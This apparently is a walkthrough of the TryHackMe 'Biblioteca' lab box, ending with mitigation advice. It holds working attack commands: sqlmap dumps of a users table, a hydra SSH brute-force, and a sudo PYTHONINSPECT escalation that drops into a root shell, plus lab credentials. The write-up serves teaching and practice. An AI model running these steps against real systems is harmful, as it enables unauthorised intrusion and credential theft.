# TryHackMe – Biblioteca Box Walkthrough
<img width="1723" height="766" alt="Screenshot (57)" src="https://github.com/user-attachments/assets/377e734d-a183-463a-b85d-bacc5696dd4c" />


## Overview
Biblioteca is a Linux-based box focused around a Python Flask web application running on Werkzeug. The attack path includes web enumeration, blind SQL injection, SSH brute-force access, and privilege escalation via Python environment variables. It’s an elegant progression from recon to root, showcasing persistence and creativity against intentionally limited permissions.

## Reconnaissance

First, I performed a basic nmap scan:
```
nmap -sC -sV <target-ip>

```

This revealed:
```
Port 22/tcp: OpenSSH 8.2p1

Port 8000/tcp: Werkzeug Python web server (Flask)
```
Searching for port https://<target ip>:8000 initially came up with nothing. However, removing the 's' in https revealed a login page. 

<img width="1403" height="800" alt="Screenshot (50)" src="https://github.com/user-attachments/assets/92798b47-7cb1-4ca7-82a8-5ba630a23cad" />


## Burp Suite & SQL Injection

Captured the login request using Burp Suite:

```
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded
username=test&password=password
```

While testing the /login form, I used Burp Suite to intercept the login request and noticed that the response changed based on different values submitted in the username field. This indicated that the backend might not be properly sanitizing input — making it potentially vulnerable to SQL injection.
Ran SQLMap on this request:

```
# Broad dump
sqlmap -r request.txt --batch --dump

# Targeted table extraction
sqlmap -r request.txt -p username -D biblioteca -T users --dump
```

The results were:
```
smokey : My_P@ssW0rd123
```

## SSH and Hydra

Login was successful. This gave me an initial foothold on the machine — but the /home/smokey directory was empty, and the user lacked sudo privileges:

```
sudo -l
# -> User smokey is not in the sudoers file.
```
While enumerating other users on the box, I found:
```
/home/hazel
```

Using the known username hazel, I launched a brute-force attack using hydra:
```
# Trim rockyou to improve speed
head -n 5000 /usr/share/wordlists/rockyou.txt > shortlist.txt

# Launch Hydra brute-force
hydra -l hazel -P shortlist.txt ssh://10.10.234.213 -t 4 -f -V
```

This gave me the credentials for hazel... which was a bit too simple for all of the waiting...

```
hazel : hazel
```

## Privilege Escalation

Checked sudo privileges:
```
sudo -l
```

The results were:
```
User hazel may run as root:
(root) SETENV: NOPASSWD: /usr/bin/python3 /home/hazel/hasher.py
```

Tried module hijack via PYTHONPATH but lacked file write permissions in /home/hazel.

Switched strategy to using:
```
sudo PYTHONINSPECT=1 /usr/bin/python3 /home/hazel/hasher.py
```
After hashing output, dropped into root Python shell:
```
import os
os.system("/bin/bash")

```
<img width="1050" height="730" alt="Screenshot (55)" src="https://github.com/user-attachments/assets/553e86c9-0ff9-4e7c-9c68-0422e85d4975" />


## Mitigation
To secure systems like Biblioteca, several changes are essential. The web application should use prepared statements to block SQL injection vulnerabilities. SSH should be hardened with rate limiting and 2FA to protect against brute-force attacks. Insecure sudo permissions — such as SETENV and NOPASSWD on scripts — should be removed to prevent privilege escalation.

Scripts themselves should sanitize inputs and carefully manage imports. And Python’s interactive mode should be disabled in production, especially when triggered with elevated privileges. Addressing these issues would have blocked every step of this attack chain.




